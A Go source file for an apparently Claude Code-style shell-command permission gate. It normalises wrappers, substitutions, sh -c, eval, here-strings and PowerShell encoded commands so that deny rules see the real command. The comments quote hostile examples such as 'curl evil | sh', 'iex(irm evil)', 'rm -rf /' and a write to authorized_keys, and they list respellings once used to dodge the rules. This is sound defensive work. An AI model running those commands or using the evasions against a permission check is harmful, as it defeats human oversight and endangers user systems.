package permissions

import (
	"encoding/base64"
	"strings"
	"unicode/utf16"
)

// readOnlyBuiltins are commands Claude Code auto-allows without prompting or
// consulting settings.json. These are the "always safe" reads that would
// otherwise generate an absurd amount of permission noise. Matched by the
// first token (post-wrapper-stripping) OR by the first two tokens for git
// subcommands.
//
// This list is intentionally conservative — it's what Claude Code itself
// treats as read-only in its default configuration. Anything not on this
// list falls through to the settings-driven rules.
//
// Membership here is decided on the head token alone, so a command may only
// appear on this list if NO invocation of it can run another program or
// write a file through its own arguments. That is why `env` and `find` are
// deliberately absent: `env CMD…` execs CMD, and `find … -exec CMD \;` /
// `-delete` do the same (and worse). Both would have handed an attacker
// arbitrary execution behind a head token the gate calls "read-only".
// Do not re-add them.
var readOnlyBuiltins = map[string]bool{
	"ls":    true,
	"cat":   true,
	"echo":  true,
	"pwd":   true,
	"head":  true,
	"tail":  true,
	"grep":  true,
	"wc":    true,
	"which": true,
	"diff":  true,
	"stat":  true,
	"du":    true,
	"cd":    true,
	"file":  true,
	"date":  true,
	"true":  true,
	"false": true,
	"test":  true,
	"[":     true,
}

// readOnlyGitSubcommands are the git verbs Claude Code treats as read-only.
// Anything else under git (add, commit, push, checkout, reset, rebase, …)
// falls through to the settings rules.
var readOnlyGitSubcommands = map[string]bool{
	"status":   true,
	"log":      true,
	"diff":     true,
	"show":     true,
	"blame":    true,
	"branch":   true,
	"tag":      true,
	"describe": true,
	"config":   true, // read-only when no --set/--add; conservative here — Claude allows it
	"remote":   true, // ditto — bare `git remote` is a list
	"rev-parse": true,
	"ls-files": true,
	"ls-tree":  true,
	"cat-file": true,
	"reflog":   true,
	"stash":    true, // `git stash list` etc.; write forms exist but common usage is read
	"shortlog": true,
	"whatchanged": true,
	"grep":     true,
}

// processWrappers are prefix commands that just delegate to their remaining
// arguments. Claude Code strips these before rule evaluation so
// `timeout 30 npm test` matches `Bash(npm test)`.
//
// Note we do NOT strip environment-runners like `direnv exec`, `devbox run`,
// `npx`, `docker exec`, `env FOO=bar cmd` — those are not on Claude Code's
// wrapper list. They change the resolution semantics enough that treating
// them as transparent would be unsafe.
//
// `xargs` stays on the list even though it, like `env`, runs a program named
// by its arguments. The difference is direction: stripping a wrapper makes
// the evaluator look at the INNER command, so `… | xargs rm -rf` is judged as
// `rm -rf` and trips the Article 13 ask. Dropping xargs here would hide that
// from every argument-bearing deny rule, which is strictly worse. What xargs
// cannot do is earn an auto-allow it wouldn't otherwise get: the read-only
// list ignores arguments anyway, so `… | xargs cat` grants no more than
// `cat` does. The residual gap — args arriving on stdin are invisible to
// pattern rules — is inherent to xargs and not fixable by classification.
var processWrappers = map[string]bool{
	"timeout": true,
	"time":    true,
	"nice":    true,
	"nohup":   true,
	"stdbuf":  true,
	"xargs":   true, // bare `xargs cmd` — options are dropped by stripWrappers
	"ionice":  true,
	"chrt":    true,
	"unbuffer": true,
}

// wrapperValueFlags names, per wrapper, the flags that take a SEPARATE value
// argument. Without this table the generic heuristic only ate a flag's value
// when it looked numeric, so `xargs -a /dev/null rm -rf /` left `/dev/null`
// standing as the head token and no `Bash(rm *)` rule could see the `rm`.
// That is the same "rules judge a spelling" failure as the duration bug in
// isWrapperValue, arriving through a different flag.
//
// The table is deliberately small: only the value-taking flags of wrappers we
// actually strip. A flag we don't list still gets the numeric heuristic, so
// missing an entry costs precision, not safety.
var wrapperValueFlags = map[string]map[string]bool{
	"timeout": {"-k": true, "--kill-after": true, "-s": true, "--signal": true},
	"nice":    {"-n": true, "--adjustment": true},
	"ionice":  {"-c": true, "-n": true, "-p": true, "-P": true, "-u": true},
	"chrt":    {"-p": true},
	"stdbuf":  {"-i": true, "-o": true, "-e": true, "--input": true, "--output": true, "--error": true},
	"time":    {"-o": true, "--output": true, "-f": true, "--format": true},
	"xargs": {
		"-a": true, "--arg-file": true,
		"-d": true, "--delimiter": true,
		"-E": true, "-e": true, "--eof": true,
		"-I": true, "-i": true, "--replace": true,
		"-L": true, "-l": true, "--max-lines": true,
		"-n": true, "--max-args": true,
		"-P": true, "--max-procs": true,
		"-s": true, "--max-chars": true,
	},
}

// headPrefixes are words that run the program named by their remaining
// arguments, in the same process image and at the same privilege. Unlike the
// processWrappers list (which is about matching a rule written for the inner
// command), these exist to stop a DENY rule being dodged by respelling: an
// anchored `Bash(rm *)` misses `command rm -rf /` and `exec rm -rf /` even
// though both run exactly the binary the rule names.
//
// `sudo`/`doas` are NOT here. They also run the program they name, but at a
// different privilege, so folding them away unconditionally would let an
// ALLOW rule written for the unprivileged spelling launder a privileged run —
// the mirror image of the bug this table fixes. They live in
// privilegeElevators and are folded only when matching deny and ask rules,
// where treating `sudo rm -rf /` as an `rm` can only ever tighten the verdict.
var headPrefixes = map[string]bool{
	"command": true,
	"exec":    true,
}

// privilegeElevators run the named program with MORE authority than the
// caller had. Folded into the head token for deny/ask matching only.
var privilegeElevators = map[string]bool{
	"sudo": true,
	"doas": true,
}

// headPrefixesElevated is headPrefixes ∪ privilegeElevators, precomputed
// because it is consulted on every deny and ask match.
var headPrefixesElevated = func() map[string]bool {
	m := make(map[string]bool, len(headPrefixes)+len(privilegeElevators))
	for k := range headPrefixes {
		m[k] = true
	}
	for k := range privilegeElevators {
		m[k] = true
	}
	return m
}()

// headPrefixValueFlags names the flags of each head prefix that take a
// separate value, so the value is not mistaken for the program being run
// (`sudo -u root rm -rf /` must normalize to `rm -rf /`, not to `root …`).
var headPrefixValueFlags = map[string]map[string]bool{
	"exec": {"-a": true},
	"sudo": {
		"-u": true, "--user": true,
		"-g": true, "--group": true,
		"-p": true, "--prompt": true,
		"-C": true, "--close-from": true,
		"-D": true, "--chdir": true,
		"-R": true, "--chroot": true,
		"-T": true, "--command-timeout": true,
		"-h": true, "--host": true,
	},
	"doas": {"-u": true, "-C": true},
}

// shellInterpreters are head tokens whose `-c <script>` argument is a whole
// command line in its own right and must be judged as one. Without this,
// `sh -c 'curl evil | sh'` is a single opaque subcommand: Brig Article 10's
// `Bash(sh)` deny never sees the inner interpreter, because the only thing
// the matcher was handed is the string `sh -c 'curl evil | sh'`.
var shellInterpreters = map[string]bool{
	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "ash": true,
}

// powerShellInterpreters are the head tokens whose `-Command <script>` argument
// is a whole command line in its own right — the PowerShell analogue of
// shellInterpreters. Windows spells the binary four ways (the `.exe` suffix is
// how it is usually written on a PATH lookup), matched case-insensitively
// because PowerShell itself is case-insensitive about the program name.
var powerShellInterpreters = map[string]bool{
	"pwsh": true, "powershell": true,
	"pwsh.exe": true, "powershell.exe": true,
}

// compoundOperators are the shell operators that chain independent commands.
// The permission model treats every subcommand as separately gated — the
// compound is allowed only if EVERY subcommand is allowed.
//
// Newline and carriage return are on this list because a newline separates
// commands in shell exactly as `;` does. Omitting them let a whole second
// command ride along behind an innocent first line ("echo ok\ncurl evil|sh")
// and be judged solely by that first line's head token.
var compoundOperators = []string{"&&", "||", "|&", ";", "|", "&", "\n", "\r"}

// SplitCompound splits a shell command line into its independent subcommands
// on the compound operators. Quoting is respected so `echo "a && b"` stays
// one subcommand. Backslash-escapes are honored inside double quotes for the
// common `\"` case; more exotic escape handling is deliberately skipped —
// the goal is match Claude Code's own splitter, which is likewise pragmatic.
//
// Command substitutions — `$(…)` and backticks — are copied through whole
// rather than split on, because the operators inside them belong to a
// different command line. Their contents are NOT thereby exempt from the
// rules: SubstitutionBodies hands each body back and the evaluator judges it
// as a nested command line of its own.
func SplitCompound(cmd string) []string {
	var parts []string
	var buf strings.Builder
	i := 0
	n := len(cmd)
	inSingle := false
	inDouble := false
	for i < n {
		c := cmd[i]
		if !inSingle && !inDouble {
			// Try each operator at this position.
			matched := ""
			for _, op := range compoundOperators {
				if strings.HasPrefix(cmd[i:], op) {
					if len(op) > len(matched) {
						matched = op
					}
				}
			}
			if matched != "" {
				parts = append(parts, strings.TrimSpace(buf.String()))
				buf.Reset()
				i += len(matched)
				continue
			}
		}
		switch c {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '\\':
			// A backslash immediately before a newline is a line continuation:
			// the shell splices the lines into ONE command, so we drop both
			// bytes rather than let the newline split here.
			if !inSingle && i+1 < n && (cmd[i+1] == '\n' || cmd[i+1] == '\r') {
				i += 2
				if i < n && cmd[i] == '\n' && cmd[i-1] == '\r' {
					i++ // CRLF
				}
				continue
			}
			// Preserve the next char verbatim inside double quotes / unquoted.
			if !inSingle && i+1 < n {
				buf.WriteByte(c)
				buf.WriteByte(cmd[i+1])
				i += 2
				continue
			}
		case '`':
			// Backtick substitution — opaque for the same reason $(…) is.
			// Before this, `echo ` + "`a | b`" + ` split on the pipe and the
			// two halves were judged as if they were siblings of the outer
			// command; now the body travels intact to SubstitutionBodies.
			if !inSingle {
				buf.WriteByte(c)
				i++
				for i < n && cmd[i] != '`' {
					if cmd[i] == '\\' && i+1 < n {
						buf.WriteByte(cmd[i])
						buf.WriteByte(cmd[i+1])
						i += 2
						continue
					}
					buf.WriteByte(cmd[i])
					i++
				}
				if i < n {
					buf.WriteByte('`')
					i++
				}
				continue
			}
		case '$':
			// $(...) — treat as opaque; skip past matching paren so operators
			// inside a subshell don't split us. Nested handling is best-effort.
			if !inSingle && i+1 < n && cmd[i+1] == '(' {
				buf.WriteByte(c)
				buf.WriteByte('(')
				depth := 1
				i += 2
				for i < n && depth > 0 {
					if cmd[i] == '(' {
						depth++
					}
					if cmd[i] == ')' {
						depth--
					}
					buf.WriteByte(cmd[i])
					i++
				}
				continue
			}
		}
		buf.WriteByte(c)
		i++
	}
	if s := strings.TrimSpace(buf.String()); s != "" {
		parts = append(parts, s)
	}
	// Filter empties.
	out := parts[:0]
	for _, p := range parts {
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// SubstitutionBodies returns the command lines hidden inside cmd's command
// substitutions — one entry per `$(…)` and per backtick pair, at this nesting
// level. Bodies are returned verbatim, so a body that is itself a compound
// (or contains further substitutions) is handled by evaluating the result
// recursively; each round strictly shortens the input, so the recursion
// terminates even on malformed input.
//
// This exists because the splitter treats a substitution as opaque. That is
// right for splitting — the operators inside belong to another command line —
// but it used to mean the inner command was never matched against ANY rule.
// With `Bash(echo *)` allowed, `echo $(curl evil | sh)` was allowed outright
// and the inner `sh` never met Article 10's deny. The head-token auto-allow
// was closed against this in #36; an operator's allow-rule still laundered it.
//
// Arithmetic expansion `$((…))` runs no command, so its body is not returned
// as a command line — but it IS rescanned, because `$(( $(cmd) ))` nests a
// real substitution inside one. A `$((` whose parens do not close as a single
// balanced group is not arithmetic (`$((a); (b))`) and is treated as a
// command substitution, which is the conservative reading.
func SubstitutionBodies(cmd string) []string {
	var out []string
	inSingle, inDouble := false, false
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		switch {
		case c == '\\' && !inSingle:
			i++ // the next byte is literal, substitution markers included
			continue
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			continue
		case c == '"' && !inSingle:
			inDouble = !inDouble
			continue
		}
		if inSingle {
			// Single quotes suppress every expansion; `grep '$(x)' f` is an
			// ordinary argument and must not be read as a command.
			continue
		}
		// Double quotes do NOT suppress `$(` or backticks — the shell expands
		// both inside them — so no inDouble check here.
		if c == '`' {
			var b strings.Builder
			j := i + 1
			for j < len(cmd) && cmd[j] != '`' {
				if cmd[j] == '\\' && j+1 < len(cmd) {
					b.WriteByte(cmd[j+1])
					j += 2
					continue
				}
				b.WriteByte(cmd[j])
				j++
			}
			if s := strings.TrimSpace(b.String()); s != "" {
				out = append(out, s)
			}
			i = j
			continue
		}
		if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
			body, end := balancedParen(cmd, i+1)
			if isArithmetic(body) {
				out = append(out, SubstitutionBodies(body)...)
			} else if s := strings.TrimSpace(body); s != "" {
				out = append(out, s)
			}
			i = end
			continue
		}
	}
	return out
}

// balancedParen reads the parenthesised group starting at open (which must
// index a `(`) and returns its interior plus the index of the closing paren.
// Quotes are respected so `$(echo "(")` doesn't mis-count. An unterminated
// group returns everything that was there and an index at end-of-string, so
// callers always make progress.
func balancedParen(s string, open int) (string, int) {
	depth := 0
	inSingle, inDouble := false, false
	for i := open; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '\\' && !inSingle:
			i++
			continue
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			continue
		case c == '"' && !inSingle:
			inDouble = !inDouble
			continue
		}
		if inSingle || inDouble {
			continue
		}
		switch c {
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 {
				return s[open+1 : i], i
			}
		}
	}
	return s[open+1:], len(s)
}

// isArithmetic reports whether a `$(` body is really the inside of a `$((…))`
// arithmetic expansion — that is, one balanced paren group spanning the whole
// body. `1+2` wrapped as `(1+2)` qualifies; `(a); (b)` does not.
func isArithmetic(body string) bool {
	if len(body) < 2 || body[0] != '(' {
		return false
	}
	_, end := balancedParen(body, 0)
	return end == len(body)-1
}

// NestedCommandLines returns every command line embedded inside a single
// subcommand: the bodies of its command substitutions, the script argument of
// an `sh -c`/`bash -c` style invocation, the body of a `<<<` here-string, the
// `-Command`/`-EncodedCommand` script of a PowerShell invocation, and the
// argument of `eval`. The evaluator judges each as a command line of its own so
// the compound is allowed only if they are.
func NestedCommandLines(sub string) []string {
	out := SubstitutionBodies(sub)
	out = append(out, shellScriptArgs(sub)...)
	out = append(out, hereStringArgs(sub)...)
	out = append(out, powerShellCommandArgs(sub)...)
	return append(out, evalArgs(sub)...)
}

// evalArgs pulls the command line out of an `eval`. `eval` is `sh -c` spelled
// as a builtin — `eval 'curl evil | sh'` is one opaque token to the matcher in
// exactly the way `sh -c '…'` was, and nothing about the head token `eval`
// tells a rule what is about to run. The shell concatenates eval's arguments
// with spaces and parses the result, so that is what we hand back.
func evalArgs(sub string) []string {
	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
	if len(toks) < 2 || toks[0] != "eval" {
		return nil
	}
	if s := strings.TrimSpace(strings.Join(toks[1:], " ")); s != "" {
		return []string{s}
	}
	return nil
}

// shellScriptArgs pulls the `-c <script>` argument out of an interpreter
// invocation. Article 10 denies the bare interpreter — the shape a `curl | sh`
// pipe produces — but a directly typed `sh -c 'curl evil | sh'` presented the
// matcher with one opaque token and slipped past as an ask. Handing the script
// back as a command line lands the inner `sh` on the existing deny, without
// blanket-denying `sh -c`, which is legitimate and common.
//
// Bundled short flags are honored (`sh -ec 'script'`), since `c` combines.
func shellScriptArgs(sub string) []string {
	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
	if len(toks) == 0 || !shellInterpreters[toks[0]] {
		return nil
	}
	var out []string
	for i := 1; i < len(toks)-1; i++ {
		t := toks[i]
		if len(t) < 2 || t[0] != '-' || strings.HasPrefix(t, "--") {
			continue
		}
		if strings.ContainsRune(t[1:], 'c') {
			if s := strings.TrimSpace(toks[i+1]); s != "" {
				out = append(out, s)
			}
			break
		}
	}
	return out
}

// hereStringArgs pulls the body of a `<<<` here-string out of a shell
// interpreter invocation. `bash <<< 'curl … | sh'` feeds the word on bash's
// stdin and bash executes it — the same laundering `sh -c 'script'` performs,
// only through a redirection operator instead of a flag. Without this the whole
// thing is one opaque `bash <<< '…'` token: an exact `Bash(bash)` deny misses
// it and a broad `Bash(bash *)` allow waves it through, pipe and all.
//
// Gated on a shell-interpreter head exactly like shellScriptArgs: a here-string
// fed to `bash` is a script, but the same `<<<` on `cat` or `grep` is ordinary
// data and must not be read as a command line.
//
// Two neighbours in the same operator family need no handling here. A `<<`
// heredoc carries its body on the following line(s), and SplitCompound already
// breaks on the newline, so a heredoc's subcommands are judged as top-level
// siblings (`bash <<EOF … curl … | sh … EOF` lands the inner `sh` on Article
// 10 that way). A `< file` redirect points at a file whose contents the gate
// cannot see — the same blind spot as xargs-on-stdin — so it is left alone.
//
// The head is normalized first (`\bash`, `/bin/bash`, `command bash` all become
// `bash`), and shellSplit has already stripped the quotes, so `<<<` may arrive
// as its own token or glued to the word (`bash <<<'curl…'`); both are handled.
func hereStringArgs(sub string) []string {
	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
	if len(toks) == 0 || !shellInterpreters[toks[0]] {
		return nil
	}
	var out []string
	for i := 1; i < len(toks); i++ {
		t := toks[i]
		var body string
		switch {
		case t == "<<<":
			if i+1 < len(toks) {
				body = toks[i+1]
			}
		case strings.HasPrefix(t, "<<<"):
			body = t[len("<<<"):]
		default:
			continue
		}
		if s := strings.TrimSpace(body); s != "" {
			out = append(out, s)
		}
	}
	return out
}

// powerShellCommandArgs is the PowerShell mirror of shellScriptArgs. It pulls
// the script out of a `-Command <script>` and decodes the base64 of a
// `-EncodedCommand <blob>`, handing each back as a command line the evaluator
// judges on its own. Without it a `pwsh -Command 'iex(irm evil)'` is one opaque
// token — Article 10's PowerShell(iex…) deny never sees the iex — and a
// `-EncodedCommand` payload is a base64 blob no matcher can read at all. This
// matters because shipmates runs on Windows, where the interpreter IS pwsh.
//
// PowerShell resolves a parameter from any unambiguous prefix, so `-Command`
// arrives as `-c`, `-com`, … and `-EncodedCommand` as `-e`, `-en`, `-enc`, …
// (plus the documented `-ec` shorthand, which is not a strict prefix). We accept
// any case-insensitive prefix of each; extracting a script that turns out to be
// some other flag's value only ADDS a match candidate, never removes one, so a
// stray match costs an extra evaluation, not safety.
//
// A `-EncodedCommand` value is UTF-16LE base64. When it decodes we evaluate the
// script; when it does NOT, we hand the raw blob back rather than dropping it,
// so an undecodable payload still has to earn a verdict — it matches no allow
// rule and no read-only builtin, so it falls through to ask instead of riding
// past on the interpreter's head token.
func powerShellCommandArgs(sub string) []string {
	toks := shellSplit(normalizeHeadToken(prepareBashCommand(sub)))
	if len(toks) == 0 || !powerShellInterpreters[strings.ToLower(toks[0])] {
		return nil
	}
	var out []string
	for i := 1; i < len(toks)-1; i++ {
		flag := toks[i]
		if len(flag) < 2 || flag[0] != '-' {
			continue
		}
		name := strings.ToLower(strings.TrimLeft(flag, "-"))
		switch {
		case name == "ec" || isFlagPrefix(name, "encodedcommand"):
			if s := decodeEncodedCommand(toks[i+1]); s != "" {
				out = append(out, s)
			}
			i++
		case isFlagPrefix(name, "command"):
			if s := strings.TrimSpace(toks[i+1]); s != "" {
				out = append(out, s)
			}
			i++
		}
	}
	return out
}

// isFlagPrefix reports whether got is a non-empty prefix of the full parameter
// name — PowerShell's unambiguous-prefix parameter matching.
func isFlagPrefix(got, full string) bool {
	return got != "" && strings.HasPrefix(full, got)
}

// decodeEncodedCommand decodes a PowerShell `-EncodedCommand` value — standard
// base64 of a UTF-16LE string — into the script it carries. An undecodable
// value (bad base64, odd byte count, or an empty result) returns the original
// blob unchanged, which is the fail-closed choice: the blob matches no allow
// rule and no read-only builtin, so the evaluator asks rather than waving the
// invocation through on its head token alone.
func decodeEncodedCommand(arg string) string {
	arg = strings.TrimSpace(arg)
	if arg == "" {
		return ""
	}
	raw, err := base64.StdEncoding.DecodeString(arg)
	if err != nil {
		return arg
	}
	decoded, ok := decodeUTF16LE(raw)
	if !ok {
		return arg
	}
	if s := strings.TrimSpace(decoded); s != "" {
		return s
	}
	return arg
}

// decodeUTF16LE turns a little-endian UTF-16 byte slice into a Go string. An
// odd length is not valid UTF-16LE and reports ok=false so the caller can fail
// closed.
func decodeUTF16LE(b []byte) (string, bool) {
	if len(b)%2 != 0 {
		return "", false
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = uint16(b[2*i]) | uint16(b[2*i+1])<<8
	}
	return string(utf16.Decode(u16)), true
}

// normalizeHeadToken rewrites a command's head token into the name of the
// program it will actually run. It resolves four respellings that all launch
// the same binary at the same privilege but defeat an anchored rule:
//
//	\rm -rf /        → rm -rf /     (backslash suppresses an alias)
//	command rm -rf / → rm -rf /
//	exec rm -rf /    → rm -rf /
//	/bin/rm -rf /    → rm -rf /
//	FOO=bar rm -rf / → rm -rf /     (leading assignments are env, not argv[0])
//
// This is the deny-list mirror of the H4 allow-list bug: a rule that names a
// command must judge the command, not one of its spellings. The result is used
// as an ADDITIONAL match candidate, never as a replacement, so a rule that
// deliberately names a path (`Bash(/usr/local/bin/deploy *)`) still matches the
// spelling it was written for.
//
// It is deliberately NOT applied to the read-only auto-allow. That list is
// the surface H4 broke, and widening what can earn a silent allow is the one
// direction worth being stingy in; the cost of leaving `/bin/ls` off it is a
// prompt.
func normalizeHeadToken(cmd string) string {
	return normalizeHeadTokenWith(cmd, headPrefixes)
}

// normalizeHeadTokenElevated is normalizeHeadToken plus `sudo`/`doas`. Only
// deny and ask matching may use it: folding an elevator can turn an unmatched
// command into a matched one, which is what we want from a rule that says
// "never", and exactly what we do not want from one that says "go ahead".
func normalizeHeadTokenElevated(cmd string) string {
	return normalizeHeadTokenWith(cmd, headPrefixesElevated)
}

func normalizeHeadTokenWith(cmd string, prefixes map[string]bool) string {
	s := strings.TrimSpace(cmd)
	// Bounded: each round either returns or strips a leading token, and a
	// command line has finitely many tokens. The cap is belt-and-braces
	// against a future edit reintroducing a non-shrinking case.
	for round := 0; round < 16; round++ {
		toks := shellSplitTokens(s)
		if len(toks) == 0 {
			return s
		}
		head := toks[0].text
		if isAssignment(head) {
			if len(toks) == 1 {
				return s // `FOO=bar` alone sets a variable; nothing runs
			}
			s = strings.TrimSpace(s[toks[1].start:])
			continue
		}
		canon := canonicalHead(head)
		if prefixes[canon] {
			values := headPrefixValueFlags[canon]
			i := 1
			for i < len(toks) && strings.HasPrefix(toks[i].text, "-") {
				flag := toks[i].text
				i++
				if flag == "--" {
					break // end of the prefix's own options
				}
				if values[flag] && i < len(toks) {
					i++
				}
			}
			if i >= len(toks) {
				return s // a prefix with nothing left to run
			}
			s = strings.TrimSpace(s[toks[i].start:])
			continue
		}
		if canon == head {
			return s
		}
		return strings.TrimSpace(canon + " " + strings.TrimSpace(s[toks[0].end:]))
	}
	return s
}

// canonicalHead reduces one head token to a bare program name: a leading
// backslash (the shell's alias-suppression prefix) is dropped and a path is
// reduced to its last component.
func canonicalHead(tok string) string {
	t := strings.TrimPrefix(tok, `\`)
	if i := strings.LastIndex(t, "/"); i >= 0 && i+1 < len(t) {
		t = t[i+1:]
	}
	return t
}

// isAssignment reports whether a token is a `NAME=value` environment
// assignment, which the shell consumes before deciding what to execute.
func isAssignment(tok string) bool {
	eq := strings.Index(tok, "=")
	if eq <= 0 {
		return false
	}
	for i := 0; i < eq; i++ {
		c := tok[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c == '_':
		case c >= '0' && c <= '9' && i > 0:
		default:
			return false
		}
	}
	return true
}

// stripWrappers peels off process-wrapper prefixes. `timeout 30 npm test`
// becomes `npm test`; `nice -n 10 pytest` becomes `pytest`. Numeric args and
// short flags after a wrapper are consumed heuristically — enough to handle
// the common cases without needing a full arg parser per wrapper.
//
// The strip runs iteratively: `time timeout 30 make test` → `timeout 30 make
// test` → `make test`. That way stacked wrappers don't need bespoke handling.
//
// The remainder is taken as a SLICE of the original line, not a re-join of
// the split tokens. Re-joining discarded quoting, so `timeout 5 echo "a; b"`
// prepped to `echo a; b` — a form the splitter then read as two commands and
// pattern rules matched against a line the shell will never see.
func stripWrappers(cmd string) string {
	for {
		toks := shellSplitTokens(cmd)
		if len(toks) == 0 {
			return cmd
		}
		head := toks[0].text
		if !processWrappers[head] {
			return cmd
		}
		// Consume the wrapper's own options. A flag known to take a separate
		// value eats the next token whatever it looks like; for anything else
		// we fall back to the numeric/duration heuristic.
		values := wrapperValueFlags[head]
		i := 1
		for i < len(toks) && looksLikeWrapperArg(toks[i].text) {
			flag := toks[i].text
			i++
			if strings.HasPrefix(flag, "-") && !strings.Contains(flag, "=") && i < len(toks) {
				if values[flag] || isWrapperValue(toks[i].text) {
					i++
				}
			}
		}
		if i >= len(toks) {
			return cmd
		}
		next := strings.TrimSpace(cmd[toks[i].start:])
		if next == cmd {
			return cmd
		}
		cmd = next
	}
}

func looksLikeWrapperArg(tok string) bool {
	if tok == "" {
		return false
	}
	if strings.HasPrefix(tok, "-") {
		return true
	}
	return isWrapperValue(tok)
}

// isWrapperValue reports whether a token looks like a value a wrapper takes
// rather than the start of the real command — a bare number (`timeout 30`)
// or a number with a unit suffix (`timeout 5s`, `timeout -k 1.5m`).
//
// Durations matter for more than tidiness: before they were recognized,
// `timeout 5s rm -rf /` stripped to `5s rm -rf /`, whose head token is `5s`.
// That is not `rm …`, so every `Bash(rm -rf*)` deny/ask rule sailed past it —
// the same "rules judge a spelling, not the command" failure as H4.
func isWrapperValue(s string) bool {
	if isNumeric(s) {
		return true
	}
	for _, unit := range []string{"ns", "us", "ms", "s", "m", "h", "d"} {
		if num := strings.TrimSuffix(s, unit); num != s && isNumeric(num) {
			return true
		}
	}
	return false
}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if (r < '0' || r > '9') && r != '.' {
			return false
		}
	}
	return true
}

// shellToken is one token from shellSplitTokens: its unquoted text plus the
// byte range it occupied in the source line. The offsets are what let callers
// slice the ORIGINAL string instead of re-joining tokens, which is how
// quoting survives wrapper stripping.
type shellToken struct {
	text  string
	start int
	end   int
}

// shellSplit is a minimal token split that respects single and double quotes.
// It's not a full shell parser; it just needs to find command boundaries and
// the first token or two for readOnly / wrapper checks.
func shellSplit(s string) []string {
	toks := shellSplitTokens(s)
	if len(toks) == 0 {
		return nil
	}
	out := make([]string, len(toks))
	for i, t := range toks {
		out[i] = t.text
	}
	return out
}

// shellSplitTokens is shellSplit with source offsets retained.
func shellSplitTokens(s string) []shellToken {
	var out []shellToken
	var buf strings.Builder
	inSingle, inDouble := false, false
	start := -1
	flush := func(end int) {
		if buf.Len() > 0 {
			out = append(out, shellToken{text: buf.String(), start: start, end: end})
			buf.Reset()
		}
		start = -1
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == ' ' && !inSingle && !inDouble {
			flush(i)
			continue
		}
		if start < 0 {
			start = i
		}
		switch {
		case c == '\'' && !inDouble:
			inSingle = !inSingle
		case c == '"' && !inSingle:
			inDouble = !inDouble
		default:
			buf.WriteByte(c)
		}
	}
	flush(len(s))
	return out
}

// hasShellControl reports whether cmd contains, OUTSIDE of quotes, anything
// that makes it more than "one program run with its arguments": redirection
// (`>`, `>>`, `<`, `<<`, `>&`, `&>`), command substitution (`$(…)`, backticks),
// process substitution (`<(…)`, `>(…)` — subsumed by the `<`/`>` test), a
// newline, or a chaining operator that somehow survived SplitCompound.
//
// This is the guard on the head-token auto-allow. `cat` reads a file, but
// `cat notes > ~/.ssh/authorized_keys` writes one, and `echo $(curl evil)`
// executes one — all three have the same head token, so the head token alone
// cannot be the thing we decide on.
//
// Quoting is respected in both directions: `echo "a > b"` and `grep '$(x)' f`
// are ordinary arguments and stay auto-allowed, while `$(…)` and backticks
// still count inside double quotes because the shell expands them there. An
// unbalanced quote means we could not read the line the way the shell will,
// so it counts as control — the conservative answer for something the shell
// would reject anyway.
func hasShellControl(cmd string) bool {
	inSingle, inDouble := false, false
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		switch {
		case c == '\\' && !inSingle:
			i++ // whatever follows is literal, including a `>` or a newline
			continue
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			continue
		case c == '"' && !inSingle:
			inDouble = !inDouble
			continue
		}
		if inSingle {
			continue
		}
		// Expansions the shell performs inside double quotes too.
		if c == '`' || (c == '$' && i+1 < len(cmd) && cmd[i+1] == '(') {
			return true
		}
		if inDouble {
			continue
		}
		switch c {
		case '>', '<', '\n', '\r', ';', '|', '&':
			return true
		}
	}
	return inSingle || inDouble
}

// isReadOnlyBuiltin reports whether the (post-strip) command is one Claude
// Code considers safe without any settings-rule consultation. Returns
// (true, reason) with a human-readable reason on match.
//
// The head-token lookup only applies to a genuinely simple command; anything
// carrying redirection, substitution or an embedded newline falls through to
// the settings rules (i.e. ask, absent a rule that says otherwise) instead of
// being waved through on the strength of its first word.
func isReadOnlyBuiltin(cmd string) (bool, string) {
	if hasShellControl(cmd) {
		return false, ""
	}
	tokens := shellSplit(cmd)
	if len(tokens) == 0 {
		return false, ""
	}
	head := tokens[0]
	if readOnlyBuiltins[head] {
		return true, "read-only builtin: " + head
	}
	if head == "git" && len(tokens) >= 2 {
		sub := tokens[1]
		if readOnlyGitSubcommands[sub] {
			return true, "read-only git: git " + sub
		}
	}
	return false, ""
}

// prepareBashCommand strips process wrappers and returns the (possibly
// modified) command line ready for rule matching.
func prepareBashCommand(cmd string) string {
	return strings.TrimSpace(stripWrappers(strings.TrimSpace(cmd)))
}
